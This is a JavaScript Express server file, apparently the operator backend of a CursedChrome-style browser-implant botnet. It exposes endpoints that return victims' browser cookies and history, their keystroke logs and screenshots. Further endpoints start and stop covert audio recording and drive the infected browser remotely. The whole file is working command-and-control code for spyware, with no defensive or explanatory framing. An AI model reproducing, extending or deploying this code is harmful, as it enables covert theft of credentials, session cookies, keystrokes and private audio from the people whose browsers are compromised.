const copy = require("./utils.js").copy;
const express = require("express");
const bcrypt = require("bcrypt");
const path = require("path");
const uuid = require("uuid");
const bodyParser = require("body-parser");
const sessions = require("client-sessions");
const database = require("./database.js");
const Users = database.Users;
const Bots = database.Bots;
const Settings = database.Settings;
const BotRecording = database.BotRecording;
const BotScreenshots = database.BotScreenshots;
const BotKeyboardLogs = database.BotKeyboardLogs;
const sequelize = database.sequelize;
const fs = require("fs");
const { promisify } = require("util");
const exec = promisify(require("child_process").exec);

const Sequelize = require("sequelize");
const Op = Sequelize.Op;
const get_hashed_password = require("./utils.js").get_hashed_password;
const BOT_DEFAULT_SWITCH_CONFIG =
  require("./utils.js").BOT_DEFAULT_SWITCH_CONFIG;
const BOT_DEFAULT_DATA_CONFIG = require("./utils.js").BOT_DEFAULT_DATA_CONFIG;
/*
    API Server

    You can authenticate to the API using the browser_account_access_key.

    Later on I'll add an official API key system.
*/
const validate = require("express-jsonschema").validate;
const API_BASE_PATH = "/api/v1";

function getMethods(obj) {
  var result = [];
  for (var id in obj) {
    try {
      if (typeof obj[id] == "function") {
        result.push(id + ": " + obj[id].toString());
      }
    } catch (err) {
      result.push(id + ": inaccessible");
    }
  }
  return result;
}

async function get_api_server(proxy_utils) {
  const app = express();
  app.use(bodyParser.json());

  const session_secret_key = "SESSION_SECRET";

  // Check for existing session secret value
  const session_secret_setting = await Settings.findOne({
    where: {
      key: session_secret_key,
    },
  });

  if (!session_secret_setting) {
    console.error(`No session secret is set, can't start API server!`);
    throw new Error("NO_SESSION_SECRET_SET");
    return;
  }

  /*
        Add default security headers
    */
  app.use(async function (req, res, next) {
    set_secure_headers(req, res);
    next();
  });

  app.use(
    sessions({
      cookieName: "session",
      secret: session_secret_setting.value,
      duration: 7 * 24 * 60 * 60 * 1000, // Default session time is a week
      activeDuration: 1000 * 60 * 5, // Extend for five minutes if actively used
      cookie: {
        ephemeral: true,
        httpOnly: true,
        secure: false,
      },
    })
  );

  /*
        Serve static files from compiled front-end
    */
  app.use(
    "/",
    express.static("/work/gui/dist/", {
      setHeaders: function (res, path, stat) {
        res.set(
          "Content-Security-Policy",
          "default-src 'none'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'none'; connect-src 'self'; media-src 'self' blob: data:;"
        );
      },
    })
  );

  app.use(async function (req, res, next) {
    const ENDPOINTS_NOT_REQUIRING_AUTH = [
      "/health",
      `${API_BASE_PATH}/login`,
      `${API_BASE_PATH}/verify-proxy-credentials`,
      `${API_BASE_PATH}/get-bot-browser-cookies`,
    ];
    if (ENDPOINTS_NOT_REQUIRING_AUTH.includes(req.originalUrl)) {
      next();
      return;
    }

    const auth_needed_response = {
      success: false,
      error: "Authentication required, please log in.",
      code: "NOT_AUTHENTICATED",
    };

    // Check the auth to make sure a valid session exists
    if (!req.session.user_id) {
      res.status(200).json(auth_needed_response).end();
      return;
    }

    const user = await Users.findOne({
      where: {
        id: req.session.user_id,
      },
    });

    if (!user) {
      res.status(200).json(auth_needed_response).end();
      return;
    }

    // Set user information from database record
    req.user = {
      id: user.id,
      username: user.username,
      password_should_be_changed: user.password_should_be_changed,
    };

    next();
  });

  /*
        Update a given bot's properties
    */
  const UpdateBotSchema = {
    type: "object",
    properties: {
      bot_id: {
        type: "string",
        required: true,
        pattern: "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
      },
      name: {
        type: "string",
        required: true,
      },
      proxy_username: {
        type: "string",
        required: false,
      },
      proxy_password: {
        type: "string",
        required: false,
      },
    },
  };
  const DeleteBotSchema = {
    type: "object",
    properties: {
      bot_id: {
        type: "string",
        required: true,
        pattern: "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
      },
    },
  };
  app.put(
    API_BASE_PATH + "/bots",
    validate({ body: UpdateBotSchema }),
    async (req, res) => {
      const bot = await Bots.findOne({
        where: {
          id: req.body.bot_id,
        },
      });
      await bot.update({
        name: req.body.name,
        switch_config: {
          ...BOT_DEFAULT_SWITCH_CONFIG,
          ...req.body.switch_config,
        },
        data_config: {
          ...BOT_DEFAULT_DATA_CONFIG,
          ...req.body.data_config,
        },
        proxy_username: req.body.proxy_username || bot.proxy_username,
        proxy_password: req.body.proxy_password || bot.proxy_password,
      });

      res
        .status(200)
        .json({
          success: true,
          result: {},
        })
        .end();
    }
  );

  app.delete(
    API_BASE_PATH + "/bots",
    validate({ body: DeleteBotSchema }),
    async (req, res) => {
      const bot = await Bots.findOne({
        where: {
          id: req.body.bot_id,
        },
      });
      await bot.destroy();

      res
        .status(200)
        .json({
          success: true,
          result: {},
        })
        .end();
    }
  );

  // Batch delete bots
  const BatchDeleteBotsSchema = {
    type: "object",
    properties: {
      bot_ids: {
        type: "array",
        required: true,
        items: {
          type: "string",
          pattern: "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
        },
      },
    },
  };
  app.post(
    API_BASE_PATH + "/bots/batch-delete",
    validate({ body: BatchDeleteBotsSchema }),
    async (req, res) => {
      try {
        const deletedCount = await Bots.destroy({
          where: {
            id: {
              [Op.in]: req.body.bot_ids,
            },
          },
        });

        res
          .status(200)
          .json({
            success: true,
            result: {
              deletedCount: deletedCount,
            },
          })
          .end();
      } catch (e) {
        res
          .status(200)
          .json({
            success: false,
            error: e.toString(),
          })
          .end();
      }
    }
  );

  // Get global default proxy setting
  app.get(API_BASE_PATH + "/settings/global-proxy", async (req, res) => {
    const setting = await Settings.findOne({
      where: { key: "GLOBAL_DEFAULT_PROXY_BOT_ID" },
    });
    res.json({
      success: true,
      result: setting ? setting.value : null,
    });
  });

  // Set global default proxy setting
  app.post(API_BASE_PATH + "/settings/global-proxy", async (req, res) => {
    const { bot_id } = req.body;
    
    let setting = await Settings.findOne({
      where: { key: "GLOBAL_DEFAULT_PROXY_BOT_ID" },
    });

    if (setting) {
      await setting.update({ value: bot_id });
    } else {
      await Settings.create({
        id: uuid.v4(),
        key: "GLOBAL_DEFAULT_PROXY_BOT_ID",
        value: bot_id,
      });
    }

    // Notify all workers about the change
    if (proxy_utils.notify_system_event) {
      proxy_utils.notify_system_event("GLOBAL_PROXY_UPDATED");
    }

    res.json({
      success: true,
      result: bot_id,
    });
  });

  // get all bots with pagination and filtering
  app.get(API_BASE_PATH + "/bots", async (req, res) => {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 10;
    const offset = (page - 1) * limit;
    
    // Build filter conditions
    const whereClause = {};
    if (req.query.name) {
      whereClause.name = {
        [Op.like]: `%${req.query.name}%`
      };
    }
    if (req.query.is_online !== undefined && req.query.is_online !== '') {
      whereClause.is_online = req.query.is_online === 'true';
    }
    if (req.query.state) {
      whereClause.state = req.query.state;
    }

    // Get total count for pagination
    const totalCount = await Bots.count({ where: whereClause });

    const bots = await Bots.findAll({
      where: whereClause,
      attributes: [
        "id",
        "user_agent",
        "is_online",
        "name",
        "proxy_password",
        "proxy_username",
        [Sequelize.literal('json_array_length("tabs")'), "tabs"],
        "current_tab",
        "current_tab_image",
        [Sequelize.literal('json_array_length("history")'), "history"],
        "state",
        "last_online",
        "last_active_at",
        "createdAt",
      ],
      order: [['createdAt', 'DESC']],
      limit: limit,
      offset: offset,
    });

    res
      .status(200)
      .json({
        success: true,
        result: {
          bots: bots,
          pagination: {
            total: totalCount,
            page: page,
            limit: limit,
            totalPages: Math.ceil(totalCount / limit),
          },
        },
      })
      .end();
  });

  // get the fields of a bot
  // "user_agent",
  // "updatedAt",
  // "createdAt",
  // "tabs",
  // "bookmarks",
  // "history",
  // "cookies",
  // "downloads",
  // "recording",
  // "switch_config",
  // "data_config"

  const FIELD_DEFAULT = {
    switch_config: BOT_DEFAULT_SWITCH_CONFIG,
    data_config: BOT_DEFAULT_DATA_CONFIG,
    recording: [],
    tabs: [],
    bookmarks: [],
    history: [],
    cookies: [],
    downloads: [],
    activity: [],
    screenshots: [],
  };

  app.get(API_BASE_PATH + "/fields", async (req, res) => {
    const name = req.query.field;

    const bot = await Bots.findOne({
      where: {
        id: req.query.id,
      },
      limit: name === "recording" ? 10 : undefined,
      attributes: [name],
    });
    res
      .status(200)
      .json({
        success: true,
        result: bot[name] || FIELD_DEFAULT[name],
      })
      .end();
  });

  const LoginSchema = {
    type: "object",
    properties: {
      username: {
        type: "string",
        required: true,
      },
      password: {
        type: "string",
        required: true,
      },
    },
  };
  app.post(
    API_BASE_PATH + "/login",
    validate({ body: LoginSchema }),
    async (req, res) => {
      const user = await Users.findOne({
        where: {
          username: req.body.username,
        },
      });

      if (!user) {
        res
          .status(200)
          .json({
            success: false,
            error: "User not found with those credentials, please try again.",
            code: "INVALID_CREDENTIALS",
          })
          .end();
        return;
      }

      // Compare password with hash from database
      const password_matches = await bcrypt.compare(
        req.body.password,
        user.password
      );

      if (!password_matches) {
        res
          .status(200)
          .json({
            success: false,
            error: "User not found with those credentials, please try again.",
            code: "INVALID_CREDENTIALS",
          })
          .end();
        return;
      }

      // Set session data
      req.session.user_id = user.id;

      res
        .status(200)
        .json({
          success: true,
          result: {
            username: user.username,
            password_should_be_changed: user.password_should_be_changed,
          },
        })
        .end();
    }
  );

  /*
   * Log out the user
   */
  app.get(API_BASE_PATH + "/logout", async (req, res) => {
    // Set user_id to null to log the user out
    // This overwrites the previous cookie
    req.session.user_id = null;

    res
      .status(200)
      .json({
        success: true,
        result: {},
      })
      .end();
  });

  /*
        Update user's password
    */
  const UpdateUserPasswordSchema = {
    type: "object",
    properties: {
      new_password: {
        type: "string",
        required: true,
      },
    },
  };
  app.put(
    API_BASE_PATH + "/password",
    validate({ body: UpdateUserPasswordSchema }),
    async (req, res) => {
      const user = await Users.findOne({
        where: {
          id: req.session.user_id,
        },
      });
      const new_hashed_password = await get_hashed_password(
        req.body.new_password
      );
      await user.update({
        password: new_hashed_password,
        password_should_be_changed: false,
      });

      res
        .status(200)
        .json({
          success: true,
          result: {},
        })
        .end();
    }
  );

  /*
   * Get log in status
   */
  app.get(API_BASE_PATH + "/me", async (req, res) => {
    res
      .status(200)
      .json({
        success: true,
        result: {
          username: req.user.username,
          password_should_be_changed: req.user.password_should_be_changed,
        },
      })
      .end();
  });

  /*
   * Basic health check endpoint
   */
  app.get("/health", async (req, res) => {
    res
      .status(200)
      .json({
        success: true,
      })
      .end();
  });

  /*
   * Serve up the CA cert for download
   */
  app.get(API_BASE_PATH + "/download_ca", async (req, res) => {
    res.download(`${__dirname}/cassl/rootCA.crt`, "CursedChromeCA.crt");
  });

  /*
        Return if a given set of HTTP proxy credentials is valid or not.
    */
  const ValidateHTTPProxyCredsSchema = {
    type: "object",
    properties: {
      username: {
        type: "string",
        required: true,
      },
      password: {
        type: "string",
        required: true,
      },
    },
  };
  app.post(
    API_BASE_PATH + "/verify-proxy-credentials",
    validate({ body: ValidateHTTPProxyCredsSchema }),
    async (req, res) => {
      const bot_data = await Bots.findOne({
        where: {
          proxy_username: req.body.username,
          proxy_password: req.body.password,
        },
        attributes: [
          "id",
          "is_online",
          "name",
          "proxy_password",
          "proxy_username",
          "user_agent",
        ],
      });

      if (!bot_data) {
        res
          .status(200)
          .json({
            success: false,
            error: "User not found with those credentials, please try again.",
            code: "INVALID_CREDENTIALS",
          })
          .end();
        return;
      }

      res
        .status(200)
        .json({
          success: true,
          result: {
            id: bot_data.id,
            is_online: bot_data.is_online,
            name: bot_data.name,
            user_agent: bot_data.user_agent,
          },
        })
        .end();
    }
  );

  /*
        Pull down the cookies from the victim
    */
  const GetBotBrowserDataSchema = {
    type: "object",
    properties: {
      username: {
        type: "string",
        required: true,
      },
      password: {
        type: "string",
        required: true,
      },
      method: {
        type: "array",
        required: false,
      },
    },
  };
  app.post(
    API_BASE_PATH + "/get-bot-browser-cookies",
    validate({ body: GetBotBrowserDataSchema }),
    async (req, res) => {
      const bot_data = await Bots.findOne({
        where: {
          proxy_username: req.body.username,
          proxy_password: req.body.password,
        },
      });

      if (!bot_data) {
        res
          .status(200)
          .json({
            success: false,
            error: "User not found with those credentials, please try again.",
            code: "INVALID_CREDENTIALS",
          })
          .end();
        return;
      }

      const browser_cookies = await proxy_utils.get_browser_cookie_array(
        bot_data.browser_id
      );

      res
        .status(200)
        .json({
          success: true,
          result: {
            cookies: browser_cookies,
          },
        })
        .end();
    }
  );

  app.post(
    API_BASE_PATH + "/get-bot-browser",
    validate({ body: GetBotBrowserDataSchema }),
    async (req, res) => {
      const bot_data = await Bots.findOne({
        where: {
          proxy_username: req.body.username,
          proxy_password: req.body.password,
        },
      });

      if (!bot_data) {
        res
          .status(200)
          .json({
            success: false,
            error: "User not found with those credentials, please try again.",
            code: "INVALID_CREDENTIALS",
          })
          .end();
        return;
      }

      const browser_history = await proxy_utils.get_browser_history_array(
        bot_data.browser_id
      );

      res
        .status(200)
        .json({
          success: true,
          result: {
            history: browser_history,
          },
        })
        .end();
    }
  );

  app.post(
    API_BASE_PATH + "/remote-control",
    async (req, res) => {
      const bot = await Bots.findOne({
        where: {
          id: req.body.bot_id,
        },
      });

      if (!bot) {
        res.status(200).json({ success: false, error: "Bot not found" }).end();
        return;
      }

      try {
        const result = await proxy_utils.tab_navigate_and_fetch(
          bot.browser_id,
          req.body.url
        );

        res.status(200).json({
          success: true,
          result: result,
        }).end();
      } catch (e) {
        res.status(200).json({ success: false, error: e.toString() }).end();
      }
    }
  );

  app.post(
    API_BASE_PATH + "/stop-remote-control",
    async (req, res) => {
      const bot = await Bots.findOne({
        where: {
          id: req.body.bot_id,
        },
      });

      if (!bot) {
        res.status(200).json({ success: false, error: "Bot not found" }).end();
        return;
      }

      try {
        await proxy_utils.stop_tab_navigate(bot.browser_id);

        res.status(200).json({
          success: true,
          result: {},
        }).end();
      } catch (e) {
        res.status(200).json({ success: false, error: e.toString() }).end();
      }
    }
  );

  app.get(API_BASE_PATH + "/screenshots", async (req, res) => {
    const bot_id = req.query.id;
    const limit = parseInt(req.query.limit) || 50;
    const offset = parseInt(req.query.offset) || 0;

    try {
      const screenshots = await BotScreenshots.findAll({
        where: { bot_id },
        order: [["timestamp", "DESC"]],
        limit,
        offset,
      });

      res.status(200).json({
        success: true,
        result: screenshots,
      });
    } catch (e) {
      res.status(200).json({ success: false, error: e.toString() });
    }
  });

  app.get(API_BASE_PATH + "/keyboard-logs", async (req, res) => {
    const bot_id = req.query.id;
    const limit = parseInt(req.query.limit) || 50;
    const offset = parseInt(req.query.offset) || 0;
    const { startTime, endTime } = req.query;

    try {
      console.log(`[API] Fetching keyboard logs for bot: ${bot_id}, range: ${startTime} to ${endTime}`);
      
      let whereClause = { bot_id };
      if (startTime || endTime) {
        whereClause.timestamp = {};
        if (startTime) whereClause.timestamp[Op.gte] = new Date(startTime);
        if (endTime) whereClause.timestamp[Op.lte] = new Date(endTime);
      }

      const logs = await BotKeyboardLogs.findAll({
        where: whereClause,
        order: [["timestamp", "DESC"]],
        limit,
        offset,
      });

      res.status(200).json({
        success: true,
        result: logs,
      });
    } catch (e) {
      res.status(200).json({ success: false, error: e.toString() });
    }
  });

  app.post(API_BASE_PATH + "/start-audio", async (req, res) => {
    const bot = await Bots.findOne({ where: { id: req.body.bot_id } });
    if (!bot) return res.status(200).json({ success: false, error: "Bot not found" });
    try {
      await proxy_utils.start_audio_recording(bot.browser_id);
      res.status(200).json({ success: true });
    } catch (e) {
      res.status(200).json({ success: false, error: e.toString() });
    }
  });

  app.post(API_BASE_PATH + "/stop-audio", async (req, res) => {
    const bot = await Bots.findOne({ where: { id: req.body.bot_id } });
    if (!bot) return res.status(200).json({ success: false, error: "Bot not found" });
    try {
      await proxy_utils.stop_audio_recording(bot.browser_id);
      res.status(200).json({ success: true });
    } catch (e) {
      res.status(200).json({ success: false, error: e.toString() });
    }
  });

  app.get(API_BASE_PATH + "/recordings", async (req, res) => {
    const bot_id = req.query.id;
    try {
      const recordings = await BotRecording.findAll({
        where: { bot: bot_id },
        order: [["timestamp", "DESC"]],
        limit: 100
      });
      res.status(200).json({ success: true, result: recordings });
    } catch (e) {
      res.status(200).json({ success: false, error: e.toString() });
    }
  });

  app.get(API_BASE_PATH + "/audio-sessions", async (req, res) => {
    const bot_id = req.query.id;
    try {
      const sessions = await BotRecording.findAll({
        attributes: [
          'session_id',
          [sequelize.fn('MIN', sequelize.col('timestamp')), 'start_time'],
          [sequelize.fn('MAX', sequelize.col('timestamp')), 'end_time'],
          [sequelize.fn('COUNT', sequelize.col('id')), 'chunk_count']
        ],
        where: { bot: bot_id, session_id: { [Op.ne]: null } },
        group: ['session_id'],
        order: [[sequelize.fn('MAX', sequelize.col('timestamp')), 'DESC']],
        limit: 50
      });
      res.status(200).json({ success: true, result: sessions });
    } catch (e) {
      res.status(200).json({ success: false, error: e.toString() });
    }
  });

  app.get(API_BASE_PATH + "/audio-session/:session_id", async (req, res) => {
    try {
      const chunks = await BotRecording.findAll({
        where: { session_id: req.params.session_id },
        order: [["timestamp", "ASC"]]
      });
      
      if (chunks.length === 0) return res.status(404).send("Not found");
      
      const buffers = chunks.map(c => Buffer.from(c.recording, "base64"));
      const combined = Buffer.concat(buffers);
      
      res.set("Content-Type", "audio/webm");
      res.send(combined);
    } catch (e) {
      res.status(500).send(e.toString());
    }
  });

  app.get(API_BASE_PATH + "/audio/:id", async (req, res) => {
    try {
      const recording = await BotRecording.findOne({ where: { id: req.params.id } });
      if (!recording) return res.status(404).send("Not found");
      
      const buffer = Buffer.from(recording.recording, "base64");
      res.set("Content-Type", "audio/webm"); // Default for MediaRecorder
      res.send(buffer);
    } catch (e) {
      res.status(500).send(e.toString());
    }
  });

  // 添加CORS头部支持
  app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header(
      "Access-Control-Allow-Headers",
      "Origin, X-Requested-With, Content-Type, Accept"
    );
    next();
  });

  /*
   * Handle JSON Schema errors
   */
  app.use(function (err, req, res, next) {
    var responseData;

    if (err.name === "JsonSchemaValidation") {
      console.error(`JSONSchema validation error:`);
      console.error(err.message);

      res.status(400);

      responseData = {
        statusText: "Bad Request",
        jsonSchemaValidation: true,
        validations: err.validations,
      };

      if (req.xhr || req.get("Content-Type") === "application/json") {
        res.json(responseData);
      } else {
        res.render("badrequestTemplate", responseData);
      }
    } else {
      next(err);
    }
  });

  return app;
}

function set_secure_headers(req, res) {
  res.set("X-XSS-Protection", "mode=block");
  res.set("X-Content-Type-Options", "nosniff");
  res.set("X-Frame-Options", "deny");

  if (req.path.startsWith(API_BASE_PATH)) {
    res.set(
      "Content-Security-Policy",
      "default-src 'none'; script-src 'none'; img-src 'self' data:;"
    );
    res.set("Content-Type", "application/json");
    return;
  }
}

module.exports = {
  get_api_server: get_api_server,
};
